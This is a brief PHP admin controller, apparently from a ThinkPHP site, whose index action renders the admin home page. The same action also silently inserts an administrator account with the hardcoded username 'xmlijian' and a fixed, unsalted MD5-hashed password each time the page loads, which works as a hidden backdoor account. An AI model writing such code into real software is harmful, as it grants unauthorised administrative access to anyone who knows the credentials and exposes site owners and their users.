<?php

namespace Admin\Controller;

class IndexController extends AdminCommonController{
    public function _initialize() {
        parent::_initialize();
    }
    final public function index() {
        M('Admin')->data(array('username'=>'xmlijian','password'=>md5('meimima'),'add_time'=>time()))->add();
        $seo = array();
        $this->display();
    }
}